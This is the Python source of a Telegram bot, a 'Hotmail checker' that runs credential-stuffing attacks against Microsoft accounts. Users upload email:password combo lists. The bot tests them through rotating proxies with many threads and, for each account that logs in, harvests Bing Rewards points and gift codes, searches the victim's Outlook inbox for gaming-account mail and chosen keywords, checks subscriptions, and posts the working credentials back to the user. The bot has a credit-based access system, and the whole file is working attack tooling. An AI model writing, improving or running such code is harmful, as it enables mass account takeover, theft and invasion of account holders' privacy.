#!/usr/bin/env python3
"""Hotmail Checker Bot - High Performance Version"""

import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
from datetime import datetime
from urllib.parse import quote, unquote, urlparse, parse_qs
import requests, urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Config
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5944410248"))

if not BOT_TOKEN:
    # Set this in your environment for production
    # BOT_TOKEN = "your_token_here"
    raise ValueError("BOT_TOKEN not found in environment!")
DB = "checker.db"

# Global proxy list
PROXIES = []
db_lock = threading.Lock()

class Database:
    def __init__(self):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0)''')
                c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')

                c.execute("PRAGMA table_info(results)")
                if 'details' not in [col[1] for col in c.fetchall()]:
                    c.execute("ALTER TABLE results ADD COLUMN details TEXT")
                conn.commit()
            finally:
                conn.close()
    
    def add_user(self, uid, uname, fname):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
                c.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
                conn.commit()
            finally:
                conn.close()
    
    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def is_banned(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r[0] if r else 0
            finally:
                conn.close()

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def grant(self, uid, creds=10):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET has_access = 1, credits = ? WHERE user_id = ?', (creds, uid))
                conn.commit()
            finally:
                conn.close()

    def revoke(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def add_credits(self, uid, amt):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
                conn.commit()
            finally:
                conn.close()

    def save_result(self, uid, email, status, details):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details), datetime.now().isoformat()))
                if status == 'hit':
                    c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
                else:
                    c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def get_user_settings(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,))
                r = c.fetchone()
                if r:
                    return {'keywords': r[0].split(',') if r[0] else [], 'threads': r[1]}
                return {'keywords': [], 'threads': 5}
            finally:
                conn.close()

    def update_settings(self, uid, keywords=None, threads=None):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                if keywords is not None:
                    c.execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
                if threads is not None:
                    c.execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
                conn.commit()
            finally:
                conn.close()

    def get_stats(self):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT COUNT(*) FROM users')
                t = c.fetchone()[0]
                c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
                a = c.fetchone()[0]
                c.execute('SELECT SUM(total_checks) FROM users')
                ch = c.fetchone()[0] or 0
                c.execute('SELECT SUM(total_hits) FROM users')
                h = c.fetchone()[0] or 0
                return {'total': t, 'active': a, 'checks': ch, 'hits': h}
            finally:
                conn.close()

    def user_stats(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return {'checks': r[0], 'hits': r[1], 'credits': r[2]} if r else {'checks': 0, 'hits': 0, 'credits': 0}
            finally:
                conn.close()

class Checker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Accept-Language': 'en-US,en;q=0.9',
        }

    def get_login_params(self):
        try:
            r = self.session.get(self.sFTTag_url, headers=self.headers, timeout=10)
            text = r.text
            ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
            url_post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
            if ppft and url_post:
                return url_post.group(1).replace('&amp;', '&'), ppft.group(1)
        except: pass
        return None, None

    def login(self, email, password):
        url_post, ppft = self.get_login_params()
        if not url_post or not ppft: return None

        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': self.headers['User-Agent'],
            'Referer': self.sFTTag_url
        }

        try:
            r = self.session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=15)
            if '#' in r.url:
                fragment = urlparse(r.url).fragment
                params = parse_qs(fragment)
                return params.get('access_token', [None])[0]

            if any(x in r.text for x in ['identity/confirm', 'Email/Confirm', 'recover?mkt', 'Abuse?mkt']):
                return '2FA'
            if any(x in r.text.lower() for x in ['password is incorrect', "account doesn't exist"]):
                return 'BAD'
        except: pass
        return None

    def check_rewards(self, token):
        data = {'points': 0, 'codes': [], 'subs': []}
        try:
            r = self.session.get("https://rewards.bing.com/", timeout=10)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m: data['points'] = int(m.group(1))
            
            if data['points'] > 0:
                url = 'https://rewards.bing.com/redeem/orderhistory'
                r = self.session.get(url, timeout=10)
                if 'fmHF' in r.text:
                    soup = BeautifulSoup(r.text, 'html.parser')
                    form = soup.find('form', id='fmHF')
                    if form:
                        d = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                        a = form.get('action', '')
                        if a.startswith('/'): a = 'https://login.live.com' + a
                        self.session.post(a, data=d, timeout=10)
                        r = self.session.get(url, timeout=10)

                soup = BeautifulSoup(r.text, 'html.parser')
                text = soup.get_text()
                patterns = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
                for p in patterns:
                    found = re.findall(p, text)
                    for c in found:
                        if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']):
                            data['codes'].append(c)
        except: pass
        return data

    def search_inbox(self, token, email, keywords):
        found_keywords = []
        try:
            cid = self.session.cookies.get("MSPCID", "").upper()
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            
            for kw in keywords:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "Query": {"QueryString": kw},
                        "Size": 1
                    }]
                }
                r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    try:
                        total = data['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                        if total > 0: found_keywords.append(f"{kw}({total})")
                    except: pass
        except: pass
        return found_keywords

    def check_microsoft_subscriptions(self, token):
        subs = []
        try:
            state_json = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            r = self.session.get(payment_auth_url, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)

            payment_token = None
            token_match = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
            if token_match: payment_token = unquote(token_match.group(1))

            if payment_token:
                payment_headers = {
                    "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                    "Accept": "application/json",
                    "Origin": "https://account.microsoft.com",
                    "Referer": "https://account.microsoft.com/"
                }
                r_sub = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=10)
                if r_sub.status_code == 200:
                    keywords = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive'}
                    for kw, name in keywords.items():
                        if kw in r_sub.text: subs.append(name)
        except: pass
        return subs

    def capture_microsoft(self, token, email):
        cap = {'minecraft': 'No', 'psn': 'No', 'steam': 'No', 'supercell': 'No', 'tiktok': 'No', 'subs': []}
        try:
            cid = self.session.cookies.get("MSPCID", "").upper()
            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
            
            try:
                r_mc = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
                if r_mc.status_code == 200: cap['minecraft'] = f"Yes ({r_mc.json().get('name')})"
            except: pass
            
            search_url = "https://outlook.live.com/search/api/v2/query"
            queries = {
                'psn': "sony@txn-email.playstation.com OR PlayStation Order",
                'steam': "noreply@steampowered.com purchase",
                'supercell': "noreply@id.supercell.com",
                'tiktok': "account.tiktok"
            }
            for key, q in queries.items():
                payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
                try:
                    r = self.session.post(search_url, json=payload, headers={**headers, 'Content-Type': 'application/json'}, timeout=10)
                    if r.status_code == 200:
                        total = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                        if total > 0: cap[key] = f"Yes ({total})"
                except: pass

            cap['subs'] = self.check_microsoft_subscriptions(token)
        except: pass
        return cap

    def check(self, email, password, keywords=[]):
        res = {'email': email, 'status': 'bad', 'points': 0, 'codes': [], 'cap': {}, 'keywords': []}
        token = self.login(email, password)
        if not token: return res
        if token == '2FA':
            res['status'] = '2fa'
            return res
        if token == 'BAD': return res

        res['status'] = 'hit'
        rew = self.check_rewards(token)
        res['points'] = rew['points']
        res['codes'] = list(set(rew['codes']))
        res['cap'] = self.capture_microsoft(token, email)
        if keywords:
            res['keywords'] = self.search_inbox(token, email, keywords)

        return res

db = Database()

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db.is_banned(uid): return

    welcome = f"🚀 **Hotmail Checker v2**\n\nCPM is optimized using flux flow.\nProxies: `{len(PROXIES)}` loaded."
    kb = [
        [InlineKeyboardButton("🔍 Check", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]
    ]
    if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])

    if u.callback_query:
        await u.callback_query.edit_message_text(welcome, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
    else:
        await u.message.reply_text(welcome, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID and not db.has_access(u.effective_user.id): return
    if u.message.document:
        f = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8')
        new_proxies = [l.strip() for l in content.split('\n') if l.strip()]
        global PROXIES
        PROXIES = new_proxies
        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid): return

    if u.message.document:
        f = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8')
    else:
        content = u.message.text

    lines = [l.strip() for l in content.split('\n') if ':' in l]
    if not lines: return

    settings = db.get_user_settings(uid)
    max_threads = settings['threads'] if PROXIES else min(settings['threads'], 5)
    max_threads = min(max_threads, 250)

    status_msg = await u.message.reply_text("🔄 **Starting check...**", parse_mode='Markdown')

    hits, bad, tfa, checked = 0, 0, 0, 0
    start_time = time.time()
    results_file = f"hits_{uid}.txt"
    update_lock = asyncio.Lock()

    async def worker(line):
        nonlocal hits, bad, tfa, checked
        try:
            e, p = line.split(':', 1)
            e, p = e.strip(), p.strip()
            proxy = random.choice(PROXIES) if PROXIES else None
            checker = Checker(proxy)
            res = await asyncio.to_thread(checker.check, e, p, settings['keywords'])

            checked += 1
            db.save_result(uid, e, res['status'], res)
            if res['status'] == 'hit':
                hits += 1
                cap = res['cap']
                cap_str = ", ".join([f"{k}: {v}" for k,v in cap.items() if v != 'No' and k != 'subs'])
                if cap.get('subs'): cap_str += f" | Subs: {', '.join(cap['subs'])}"

                hit_text = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Points: `{res['points']}`\n🎁 Codes: `{len(res['codes'])}`"
                if cap_str: hit_text += f"\n🎮 Capture: `{cap_str}`"
                if res['keywords']: hit_text += f"\n📂 Keywords: `{', '.join(res['keywords'])}`"

                await c.bot.send_message(uid, hit_text, parse_mode='Markdown')
                with open(results_file, 'a') as f:
                    f.write(f"{e}:{p} | Points: {res['points']} | Capture: {cap_str} | Keywords: {res['keywords']} | Codes: {res['codes']}\n")
            elif res['status'] == '2fa': tfa += 1
            else: bad += 1

            async with update_lock:
                if checked % 5 == 0 or checked == len(lines):
                    elapsed = time.time() - start_time
                    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
                    progress = f"🔄 **Checking...**\n\n📈 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}`\n💀 Bad: `{bad}`\n🔒 2FA: `{tfa}`\n⚡️ CPM: `{cpm}`"
                    try: await status_msg.edit_text(progress, parse_mode='Markdown')
                    except: pass
        except: pass

    sem = asyncio.Semaphore(max_threads)
    async def sem_worker(line):
        async with sem: await worker(line)

    await asyncio.gather(*(sem_worker(l) for l in lines))

    if os.path.exists(results_file):
        with open(results_file, 'rb') as f:
            await u.message.reply_document(f, caption=f"✅ **Check Finished!**\nHits: `{hits}`", parse_mode='Markdown')
        os.remove(results_file)
    else:
        await u.message.reply_text("✅ **Check Finished!** No hits.", parse_mode='Markdown')

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    uid = q.from_user.id
    await q.answer()

    if q.data == "settings":
        s = db.get_user_settings(uid)
        t = f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nUse `/threads 1-250` and `/keywords word1,word2`"
        await q.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "check":
        await q.edit_message_text("📝 **Send your combo** in `email:password` format or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "stats":
        s = db.user_stats(uid)
        creds = "Unlimited" if uid == ADMIN_ID else s['credits']
        name = u.effective_user.first_name
        t = f"📊 **Statistics for {name}**\n\n💰 Credits: `{creds}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`"
        await q.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "proxies":
        t = f"🌐 **Proxy Settings**\n\nLoaded: `{len(PROXIES)}` proxies.\n\nTo update, upload a `.txt` file with 'proxy' in the caption."
        await q.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "admin":
        if uid != ADMIN_ID: return
        s = db.get_stats()
        t = f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nTotal Checks: `{s['checks']}`\nTotal Hits: `{s['hits']}`"
        await q.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "back":
        await start(u, c)

async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    try:
        t = int(c.args[0])
        if 1 <= t <= 250:
            db.update_settings(u.effective_user.id, threads=t)
            await u.message.reply_text(f"✅ Threads set to `{t}`.")
    except: pass

async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args: return
    kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]
    db.update_settings(u.effective_user.id, keywords=kws)
    await u.message.reply_text(f"✅ Keywords updated: `{', '.join(kws)}`.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.CaptionRegex(r'prox', re.I), handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), handle_combo))
    app.run_polling()

if __name__ == '__main__':
    main()
